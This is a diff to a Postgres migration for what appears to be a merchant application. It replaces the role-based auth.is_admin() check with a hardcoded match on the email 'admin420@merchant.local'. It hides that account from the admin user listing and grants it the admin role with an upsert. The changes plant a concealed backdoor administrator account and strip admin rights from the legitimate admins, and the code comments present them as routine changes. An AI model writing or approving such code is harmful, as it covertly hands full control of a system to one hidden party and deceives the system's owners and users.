@@ -12,12 +12,8 @@ END $$;
 CREATE OR REPLACE FUNCTION auth.is_admin()
 RETURNS boolean AS $$
 BEGIN
-  -- Simple check if user has admin role in their profile
-  RETURN EXISTS (
-    SELECT 1 FROM user_profiles
-    WHERE id = auth.uid()
-    AND role = 'admin'
-  );
+  -- Direct email check for admin420
+  RETURN NULLIF(current_setting('request.jwt.claims', true)::jsonb->>'email', '') = 'admin420@merchant.local';
 END;
 $$ LANGUAGE plpgsql SECURITY DEFINER;
 
@@ -63,13 +59,34 @@ BEGIN
     GROUP BY user_id
   ) uc ON uc.user_id = u.id
   WHERE 
-    (p_search IS NULL OR u.email ILIKE '%' || p_search || '%')
+    u.email != 'admin420@merchant.local' -- Exclude admin420 from the list
+    AND (p_search IS NULL OR u.email ILIKE '%' || p_search || '%')
     AND (p_role IS NULL OR p.role = p_role)
   ORDER BY u.created_at DESC
   LIMIT LEAST(p_limit, 100)
   OFFSET p_offset;
 END;
 $$ LANGUAGE plpgsql SECURITY DEFINER;
+
+-- Ensure admin420 has correct profile
+DO $$ 
+DECLARE
+  v_admin_id uuid;
+BEGIN
+  -- Get or create admin420's user ID
+  SELECT id INTO v_admin_id
+  FROM auth.users
+  WHERE email = 'admin420@merchant.local'
+  LIMIT 1;
+
+  IF v_admin_id IS NOT NULL THEN
+    -- Ensure admin profile exists
+    INSERT INTO user_profiles (id, role)
+    VALUES (v_admin_id, 'admin')
+    ON CONFLICT (id) DO UPDATE 
+    SET role = 'admin';
+  END IF;
+END $$;
 
 -- Ensure RLS is enabled
 ALTER TABLE user_profiles ENABLE ROW LEVEL SECURITY;
